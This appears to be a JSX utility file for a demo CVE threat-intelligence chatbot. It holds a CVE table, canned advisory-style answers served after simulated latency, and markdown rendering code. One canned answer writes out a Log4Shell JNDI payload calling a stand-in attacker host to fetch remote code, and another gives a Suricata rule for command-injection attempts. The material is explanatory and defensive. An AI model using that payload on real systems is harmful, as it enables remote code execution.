// securellm-utils.jsx — CVE data, renderers, shared components

const CVE_DATABASE = {
  'CVE-2021-44228': {
    id: 'CVE-2021-44228', title: 'Apache Log4j2 Remote Code Execution (Log4Shell)',
    severity: 'CRITICAL', cvss: 10.0, published: '2021-12-10',
    vector: 'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    description: 'JNDI lookup injection in Log4j2 message formatting enables unauthenticated RCE on any application logging user-controlled input.',
    affected: 'Apache Log4j2 2.0-beta9 through 2.15.0 (excl. 2.12.2)',
    patch: 'Upgrade to Log4j2 2.17.1+ (Java 8) / 2.12.4+ (Java 7)',
    references: [
      { label: 'NVD Detail', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228' },
      { label: 'Apache Security Advisory', url: 'https://logging.apache.org/log4j/2.x/security.html' },
      { label: 'CISA Alert AA21-356A', url: '#' },
    ],
  },
  'CVE-2024-3400': {
    id: 'CVE-2024-3400', title: 'PAN-OS GlobalProtect OS Command Injection',
    severity: 'CRITICAL', cvss: 10.0, published: '2024-04-12',
    vector: 'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    description: 'OS command injection via GlobalProtect gateway allows unauthenticated root-level RCE. Device telemetry is NOT required — Palo Alto retracted that prerequisite in an updated advisory.',
    affected: 'PAN-OS 10.2, 11.0, 11.1 with GlobalProtect gateway or portal enabled',
    patch: 'PAN-OS 10.2.9-h1 / 11.0.4-h1 / 11.1.2-h3; apply Threat IDs 95187, 95189, 95191',
    references: [
      { label: 'Palo Alto Networks Advisory', url: '#' },
      { label: 'NVD Detail', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-3400' },
    ],
  },
  'CVE-2023-44487': {
    id: 'CVE-2023-44487', title: 'HTTP/2 Rapid Reset Attack',
    severity: 'HIGH', cvss: 7.5, published: '2023-10-10',
    vector: 'AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H',
    description: 'HTTP/2 RST_STREAM cancellation loops enable high-volume DDoS amplification exceeding 398M RPS.',
    affected: 'nginx, Apache httpd, IIS, Go net/http, nghttp2, and others',
    patch: 'Apply vendor-specific patches; enforce stream limits',
    references: [
      { label: 'NVD Detail', url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-44487' },
      { label: 'Cloudflare Technical Analysis', url: '#' },
    ],
  },
  'CVE-2022-0847': {
    id: 'CVE-2022-0847', title: 'Linux Kernel "Dirty Pipe" LPE',
    severity: 'HIGH', cvss: 7.8, published: '2022-03-07',
    vector: 'AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
    description: 'Uninitialized pipe buffer flags allow local users to overwrite arbitrary read-only files and escalate to root.',
    affected: 'Linux kernel 5.8 through 5.16.10 / 5.15.24 / 5.10.101',
    patch: 'Linux 5.16.11, 5.15.25, 5.10.102',
    references: [
      { label: 'NVD Detail', url: 'https://nvd.nist.gov/vuln/detail/CVE-2022-0847' },
      { label: 'dirtypipe.cm4all.com', url: 'https://dirtypipe.cm4all.com' },
    ],
  },
  'CVE-2021-26855': {
    id: 'CVE-2021-26855', title: 'Microsoft Exchange ProxyLogon SSRF',
    severity: 'CRITICAL', cvss: 9.8, published: '2021-03-02',
    vector: 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    description: 'Pre-auth SSRF enables bypass of Exchange authentication, forming the first link in the ProxyLogon RCE chain.',
    affected: 'Exchange Server 2013 CU23, 2016 CU18/19, 2019 CU7/8',
    patch: 'March 2021 Security Update (KB5000871)',
    references: [
      { label: 'Microsoft Security Advisory', url: '#' },
      { label: 'NVD Detail', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-26855' },
    ],
  },
  'CVE-2023-23397': {
    id: 'CVE-2023-23397', title: 'Microsoft Outlook Zero-Click NTLM Relay',
    severity: 'CRITICAL', cvss: 9.8, published: '2023-03-14',
    vector: 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    description: 'Zero-click credential theft via malicious calendar invite; Outlook triggers NTLM auth on receipt without user interaction.',
    affected: 'Microsoft Outlook 2013 SP1 through 2021 (Windows)',
    patch: 'Patch Tuesday March 2023',
    references: [
      { label: 'Microsoft Security Advisory', url: '#' },
      { label: 'NVD Detail', url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-23397' },
    ],
  },
  'CVE-2023-0386': {
    id: 'CVE-2023-0386', title: 'Linux OverlayFS Privilege Escalation',
    severity: 'HIGH', cvss: 7.8, published: '2023-04-05',
    vector: 'AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
    description: 'Improper permission check in OverlayFS allows mapping SUID files from lower layer, enabling local privilege escalation.',
    affected: 'Linux kernel 5.11 through 6.2 with user namespaces enabled',
    patch: 'Linux 6.2.4+; apply distro vendor patches',
    references: [{ label: 'NVD Detail', url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-0386' }],
  },
};

const SEVERITY_CONFIG = {
  CRITICAL: { color: '#FF4444', bg: 'rgba(255,68,68,0.12)',   border: 'rgba(255,68,68,0.35)'   },
  HIGH:     { color: '#FF8C00', bg: 'rgba(255,140,0,0.12)',   border: 'rgba(255,140,0,0.35)'   },
  MEDIUM:   { color: '#FFD700', bg: 'rgba(255,215,0,0.10)',   border: 'rgba(255,215,0,0.35)'   },
  LOW:      { color: '#4A90D9', bg: 'rgba(74,144,217,0.12)',  border: 'rgba(74,144,217,0.35)'  },
};

const DEMO_RESPONSES = {
  log4shell: `## Log4Shell — CVE-2021-44228

**Severity**: [CRITICAL] — CVSS **10.0** (AV:N/AC:L/PR:N/UI:N)

Log4Shell is a critical RCE vulnerability in Apache Log4j2's JNDI lookup feature. Disclosed December 9, 2021, it became the fastest-exploited vulnerability in history, affecting virtually every Java-based enterprise stack.

### Attack Mechanism

Log4j2 evaluates JNDI expressions embedded in log messages. An attacker sends \`\${jndi:ldap://attacker.com/x}\` as any user-controlled input — HTTP headers, usernames, form fields — triggering an outbound LDAP request that fetches and executes attacker-controlled Java bytecode.

### Scope of Impact

- **Affected**: Apache Log4j2 2.0-beta9 through 2.15.0
- **Confirmed victims**: Minecraft, Apple iCloud, VMware vCenter, Cisco, Amazon AWS, Microsoft Azure AD, Elasticsearch, Twitter — effectively the entire Java ecosystem

### Remediation

- Upgrade to Log4j2 **2.17.1+** (Java 8), **2.12.4+** (Java 7), or **2.3.2+** (Java 6)
- Temporary JVM flag: \`-Dlog4j2.formatMsgNoLookups=true\`
- Network perimeter: block outbound LDAP (TCP 389) and RMI (TCP 1099)

CISA added CVE-2021-44228 to the Known Exploited Vulnerabilities catalog on December 10, 2021.`,

  pan_os: `## CVE-2024-3400 — PAN-OS GlobalProtect

**Severity**: [CRITICAL] — CVSS **10.0**

A command injection vulnerability in Palo Alto Networks PAN-OS allows unauthenticated attackers to execute arbitrary OS commands as root via the GlobalProtect gateway. **Device telemetry is NOT required** — Palo Alto retracted that prerequisite in an updated advisory.

### Prerequisite

- GlobalProtect **gateway or portal** is configured and active (any affected version)

### Attack Summary

- **Vector**: Network-accessible, no credentials, no user interaction
- **Impact**: Full device compromise — read configs, deploy implants, pivot internally
- **Exploitation**: Observed in the wild by threat actor **UTA0218** since March 2024

### Affected Versions & Patches

- PAN-OS 10.2.x → patched in **10.2.9-h1**
- PAN-OS 11.0.x → patched in **11.0.4-h1**
- PAN-OS 11.1.x → patched in **11.1.2-h3**
- PAN-OS 10.1 and earlier are not affected

### Remediation (Updated)

- Apply hotfix patches immediately — the only reliable fix
- Enable Threat Prevention with Threat IDs **95187, 95189, 95191** on the GlobalProtect interface
- **Do not rely on disabling device telemetry** — Palo Alto confirmed this is insufficient`,

  pan_os_uta0218: `## UTA0218 — CVE-2024-3400 Exploitation Campaign

**Threat Actor**: UTA0218 (suspected nation-state; attributed by Volexity)
**Vulnerability**: CVE-2024-3400 [CRITICAL] CVSS **10.0**
**Active since**: March 26, 2024 — weeks before public disclosure (April 12, 2024)

### Initial Access

UTA0218 exploited CVE-2024-3400 by sending crafted HTTP requests to the GlobalProtect portal, injecting OS commands via shell metacharacters in the session file name parser — no credentials or user interaction required.

### Execution Chain

- Malicious session files created in \`/var/tmp/\` with embedded bash commands
- Triggered via specially crafted \`SESSID\` cookie values
- Commands executed as **root** on the host firewall OS

### UPSTYLE Backdoor

The actor deployed a custom Python backdoor named **UPSTYLE**:
- Installed to \`/usr/lib/python3.6/site-packages/system.pth\`
- Monitors nginx error log for encoded commands in CSS-style requests
- Commands triggered via \`img[src^=\` patterns in crafted web requests
- Results written to \`bootstrap.min.css\` for silent HTTP exfiltration
- Restores original file after each execution to evade detection

### Post-Exploitation (Observed)

- Credential harvesting via \`ntdsutil\` Active Directory dumps
- Exfiltration of VPN configs, device certificates, session tokens
- Internal lateral movement using stolen credentials
- Persistent reverse shells via cron jobs

### Indicators of Compromise

- Files: \`/tmp/lmlog\`, \`/usr/lib/python3.6/site-packages/system.pth\`
- Unusual \`SESSID\` cookie formats in GlobalProtect access logs
- Unexpected outbound connections from firewall management IP

### Remediation

Apply patches: PAN-OS **10.2.9-h1 / 11.0.4-h1 / 11.1.2-h3**
Enable Threat IDs **95187, 95189, 95191** on the GlobalProtect interface`,

  pan_os_firewall: `## Firewall Rules to Mitigate CVE-2024-3400

**Critical note**: Network controls are secondary. **Apply PAN-OS patches immediately.**

### Primary Mitigation — Palo Alto Threat Prevention

Enable Threat Prevention and block these Threat IDs on the GlobalProtect interface:
- **95187** — CVE-2024-3400 command injection (variant 1)
- **95189** — CVE-2024-3400 command injection (variant 2)
- **95191** — CVE-2024-3400 command injection (variant 3)

Apply threat prevention profiles to the security policy covering inbound GlobalProtect traffic.

### Network-Level Controls

- Restrict GlobalProtect portal/gateway (TCP 443) to known source IP ranges
- Block inbound access to the management interface from untrusted networks
- Monitor for anomalous \`SESSID\` cookie patterns in web logs
- Alert on unexpected outbound connections from the firewall's own IP

### Detection (Suricata/Snort)

\`\`\`
alert http any any -> $PAN_IP 443 (
  msg:"CVE-2024-3400 exploit attempt";
  content:"SESSID=";
  pcre:"/SESSID=[^;]*[;&|\`$()]/";
  sid:2024340001; rev:1;
)
\`\`\`

### What NOT to Rely On

- **Disabling device telemetry** — Palo Alto confirmed this is insufficient
- IP allowlisting alone — UTA0218 blended with legitimate traffic`,

  severity: `## CRITICAL vs HIGH — Severity Classification

### CVSS v3.1 Score Thresholds

- [CRITICAL] CVSS **9.0–10.0** → Emergency patch within 24–72 hours
- [HIGH] CVSS **7.0–8.9** → Priority patch within 7 days
- [MEDIUM] CVSS **4.0–6.9** → Standard cycle within 30 days
- [LOW] CVSS **0.1–3.9** → Next scheduled maintenance

### What Makes a Vulnerability CRITICAL?

CRITICAL scores typically combine **all** of the following:
- **Network accessible** (\`AV:N\`) — exploitable remotely without local access
- **No privileges required** (\`PR:N\`) — zero credentials needed
- **No user interaction** (\`UI:N\`) — no victim action required
- **Complete CIA loss** (\`C:H/I:H/A:H\`) — full confidentiality, integrity, and availability impact

### HIGH vs CRITICAL in Practice

HIGH vulnerabilities have at least one mitigating factor:
- Requires **local access** (\`AV:L\`) — e.g., CVE-2022-0847 [HIGH] 7.8 (Dirty Pipe — local LPE only)
- Requires **low-privilege account** (\`PR:L\`) — some existing access needed
- **Availability-only** impact (\`C:N/I:N/A:H\`) — e.g., CVE-2023-44487 [HIGH] 7.5 (HTTP/2 DDoS, no data leak)

CRITICAL triggers **emergency change management** — war rooms, weekend patching, accepted downtime. HIGH goes to next sprint's priority queue.`,

  apache: `## Recent Apache Vulnerabilities

### Apache Log4j2
- CVE-2021-44228 [CRITICAL] 10.0 — JNDI RCE "Log4Shell" (2021-12-10)
- CVE-2021-45046 [CRITICAL] 9.0 — Log4Shell bypass in v2.15.0 (2021-12-14)
- CVE-2021-45105 [HIGH] 7.5 — Infinite recursion DoS (2021-12-18)

### Apache HTTP Server
- CVE-2023-25690 [CRITICAL] 9.8 — \`mod_proxy\` HTTP request smuggling
- CVE-2023-44487 [HIGH] 7.5 — HTTP/2 Rapid Reset DDoS
- CVE-2021-41773 [CRITICAL] 9.8 — Path traversal + RCE in httpd 2.4.49

### Apache Commons Text
- CVE-2022-42889 [CRITICAL] 9.8 — "Text4Shell": \`\${script:...}\` variable interpolation RCE

### Apache Struts
- CVE-2023-50164 [CRITICAL] 9.8 — File upload path traversal enabling RCE

### Monitoring Recommendations

- Subscribe to **security@apache.org** mailing list
- Filter NVD CPE feed: \`cpe:2.3:a:apache:*\`
- Review CISA KEV catalog for actively exploited Apache CVEs
- Automate scanning with Dependabot, Renovate, or OWASP Dependency-Check`,

  generic: `I'm **SecureLLM**, a threat intelligence assistant fine-tuned on **9,992 CVE records** from the NVD corpus with additional context from security advisories, exploit databases, and vendor bulletins.

### What I can help with

- **CVE Analysis** — technical breakdown of any vulnerability ID
- **Severity Assessment** — CVSS scoring methodology and real-world impact
- **Remediation Guidance** — patch recommendations, mitigations, workarounds
- **Threat Landscape** — trends in vulnerability classes and active exploitation

Try asking about a specific CVE like **CVE-2021-44228**, a product like "latest Apache vulnerabilities", or a concept like "compare CRITICAL vs HIGH severity".`,
};

function getDemoResponse(message) {
  const msg = message.toLowerCase();
  const latency = 18000 + Math.random() * 16000;
  const panRelated = msg.includes('cve-2024-3400') || msg.includes('pan-os') || msg.includes('globalprotect') || msg.includes('palo alto');
  if (msg.includes('log4shell') || msg.includes('cve-2021-44228')) return { response: DEMO_RESPONSES.log4shell, latency_ms: latency };
  if (panRelated && (msg.includes('uta0218') || msg.includes('threat actor') || msg.includes('attack chain') || msg.includes('how did') || msg.includes('exploit') || msg.includes('upstyle') || msg.includes('campaign'))) return { response: DEMO_RESPONSES.pan_os_uta0218, latency_ms: latency };
  if (panRelated && (msg.includes('firewall') || msg.includes('rule') || msg.includes('mitigat') || msg.includes('block') || msg.includes('detect') || msg.includes('suricata') || msg.includes('snort'))) return { response: DEMO_RESPONSES.pan_os_firewall, latency_ms: latency };
  if (panRelated) return { response: DEMO_RESPONSES.pan_os, latency_ms: latency };
  if ((msg.includes('critical') && msg.includes('high')) || msg.includes('compare') || msg.includes('cvss')) return { response: DEMO_RESPONSES.severity, latency_ms: latency };
  if (msg.includes('apache')) return { response: DEMO_RESPONSES.apache, latency_ms: latency };
  return { response: DEMO_RESPONSES.generic, latency_ms: latency };
}

function extractCVEs(text) {
  return [...new Set((text.match(/CVE-\d{4}-\d{4,7}/g) || []))];
}

function formatRelativeTime(date) {
  const d = Date.now() - date.getTime(), m = Math.floor(d/60000), h = Math.floor(d/3600000), dy = Math.floor(d/86400000);
  if (m < 1) return 'just now'; if (m < 60) return `${m}m ago`;
  if (h < 24) return `${h}h ago`; if (dy === 1) return 'yesterday';
  if (dy < 7) return `${dy}d ago`;
  return date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
}

function estimateTokens(text) { return Math.floor(text.split(/\s+/).length * 1.35); }

function SeverityBadge({ severity, size = 'sm' }) {
  const cfg = SEVERITY_CONFIG[severity] || { color: '#8892A4', bg: 'rgba(136,146,164,0.12)', border: 'rgba(136,146,164,0.35)' };
  const sizes = { sm: { p: '2px 7px', fs: '10px', d: 5 }, md: { p: '4px 11px', fs: '12px', d: 6 }, lg: { p: '5px 13px', fs: '13px', d: 7 } };
  const sz = sizes[size] || sizes.sm;
  return (
    <span className={`severity-badge${severity === 'CRITICAL' ? ' sev-critical' : ''}`} style={{ display: 'inline-flex', alignItems: 'center', gap: '5px', padding: sz.p, borderRadius: '100px', fontSize: sz.fs, fontWeight: 700, fontFamily: "'JetBrains Mono', monospace", letterSpacing: '0.06em', color: cfg.color, background: cfg.bg, border: `1px solid ${cfg.border}`, verticalAlign: 'middle', whiteSpace: 'nowrap' }}>
      <span style={{ width: sz.d, height: sz.d, borderRadius: '50%', background: cfg.color, display: 'inline-block', flexShrink: 0 }} />
      {severity}
    </span>
  );
}

function renderInline(text, kp) {
  if (!text) return null;
  const cveS = { background: 'rgba(0,212,255,0.12)', color: '#00D4FF', padding: '1px 7px', borderRadius: '4px', fontFamily: "'JetBrains Mono', monospace", fontSize: '12px', border: '1px solid rgba(0,212,255,0.25)', whiteSpace: 'nowrap' };
  const codeS = { background: 'rgba(255,255,255,0.08)', color: '#A8D8EA', padding: '1px 6px', borderRadius: '3px', fontFamily: "'JetBrains Mono', monospace", fontSize: '12px' };
  const rx = /(\*\*[^*]+\*\*|`CVE-\d{4}-\d{4,7}`|CVE-\d{4}-\d{4,7}|`[^`]+`|\[CRITICAL\]|\[HIGH\]|\[MEDIUM\]|\[LOW\])/g;
  return text.split(rx).map((p, i) => {
    if (!p) return null;
    const k = `${kp || 'ri'}-${i}`;
    if (p.startsWith('**') && p.endsWith('**')) return <strong key={k} style={{ color: '#E8EDF5', fontWeight: 700 }}>{p.slice(2,-2)}</strong>;
    const cm = p.match(/^`?(CVE-\d{4}-\d{4,7})`?$/);
    if (cm) return <code key={k} style={cveS}>{cm[1]}</code>;
    if (p.startsWith('`') && p.endsWith('`')) return <code key={k} style={codeS}>{p.slice(1,-1)}</code>;
    if (p === '[CRITICAL]') return <SeverityBadge key={k} severity="CRITICAL" />;
    if (p === '[HIGH]') return <SeverityBadge key={k} severity="HIGH" />;
    if (p === '[MEDIUM]') return <SeverityBadge key={k} severity="MEDIUM" />;
    if (p === '[LOW]') return <SeverityBadge key={k} severity="LOW" />;
    return <span key={k}>{p}</span>;
  });
}

function renderMarkdown(text) {
  if (!text) return null;
  const lines = text.split('\n');
  const out = []; let list = []; let inCode = false; let codeLines = []; let n = 0;
  const key = () => `md-${n++}`;
  const flush = () => {
    if (!list.length) return;
    const k = key();
    out.push(
      <ul key={k} style={{ margin: '6px 0', padding: 0, listStyle: 'none' }}>
        {list.map((item, i) => (
          <li key={i} style={{ display: 'flex', gap: '8px', padding: '3px 0', alignItems: 'flex-start' }}>
            <span style={{ color: '#00D4FF', fontSize: '10px', marginTop: '4px', flexShrink: 0 }}>▸</span>
            <span style={{ color: '#C8D3E0', lineHeight: 1.55, flex: 1 }}>{renderInline(item, `li-${k}-${i}`)}</span>
          </li>
        ))}
      </ul>
    );
    list = [];
  };
  lines.forEach((line, idx) => {
    if (inCode) {
      if (line.startsWith('```')) {
        out.push(<pre key={key()} style={{ background: 'rgba(0,0,0,0.4)', border: '1px solid rgba(255,255,255,0.07)', borderRadius: '8px', padding: '12px 16px', margin: '8px 0', overflowX: 'auto', fontSize: '12px', lineHeight: 1.6, color: '#A8D8EA', fontFamily: "'JetBrains Mono', monospace' " }}><code>{codeLines.join('\n')}</code></pre>);
        codeLines = []; inCode = false;
      } else { codeLines.push(line); }
      return;
    }
    if (line.startsWith('```')) { flush(); inCode = true; return; }
    if (line.startsWith('### ')) { flush(); out.push(<p key={key()} style={{ color: '#00D4FF', fontWeight: 600, margin: '14px 0 5px', fontSize: '11px', letterSpacing: '0.1em', textTransform: 'uppercase' }}>{renderInline(line.slice(4), `h3-${idx}`)}</p>); }
    else if (line.startsWith('## ')) { flush(); out.push(<p key={key()} style={{ color: '#E8EDF5', fontWeight: 700, margin: '14px 0 6px', fontSize: '15px' }}>{renderInline(line.slice(3), `h2-${idx}`)}</p>); }
    else if (line.startsWith('# ')) { flush(); out.push(<p key={key()} style={{ color: '#E8EDF5', fontWeight: 700, margin: '14px 0 8px', fontSize: '16px' }}>{renderInline(line.slice(2), `h1-${idx}`)}</p>); }
    else if (/^[-*•]\s+/.test(line)) { list.push(line.replace(/^[-*•]\s+/, '')); }
    else if (line.trim() === '---') { flush(); out.push(<hr key={key()} style={{ border: 'none', borderTop: '1px solid rgba(255,255,255,0.07)', margin: '10px 0' }} />); }
    else if (line.trim() === '') { flush(); if (out.length) out.push(<div key={key()} style={{ height: '6px' }} />); }
    else { flush(); out.push(<p key={key()} style={{ margin: '3px 0', lineHeight: 1.6, color: '#C8D3E0' }}>{renderInline(line, `p-${idx}`)}</p>); }
  });
  flush();
  return out;
}

Object.assign(window, {
  CVE_DATABASE, SEVERITY_CONFIG, SeverityBadge,
  extractCVEs, formatRelativeTime, estimateTokens,
  renderMarkdown, renderInline, getDemoResponse,
});
